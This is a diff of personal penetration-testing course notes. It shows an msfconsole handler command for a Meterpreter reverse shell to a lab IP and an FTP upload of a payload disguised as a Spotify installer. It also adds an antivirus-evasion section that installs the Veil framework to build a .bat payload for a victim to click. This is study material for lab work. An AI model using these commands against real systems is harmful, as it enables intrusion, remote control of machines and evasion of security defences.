@@ -1005,7 +1005,7 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
       SET LHOST: 192.168.45.152
       SET LPORT: 443
       ```
-    - Before transferring the file, setting up a handler for the meterpreter payload
+    - Before transferring the file, setting up a handler for the meterpreter payload  
       `msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.152;set LPORT 443;run;"`  
     - Transfer the file `ftp -A 192.168.245.53`  `ftp> bin` `put SpotifyFullWin10-32bit.exe`  
     - meterpreter session open
@@ -1764,6 +1764,15 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
       
       affected URL/endpoint + method of triggering the vulnerability  
     - **appendices**: articles, reference
+
+### Antivirus Evasion  
+- Capstone Lab: malicious script cannot be double-clicked by the user for an immediate execution. Utilize [veil](https://github.com/Veil-Framework/Veil) framework. Victim will click on .bat file
+  - install Veil framework
+    ```
+    sudo apt -y install veil
+    /usr/share/veil/config/setup.sh --force --silent
+    ```
+  - 
 
 ## Penetration testing stages
 1. scope: IP range, hosts, applications
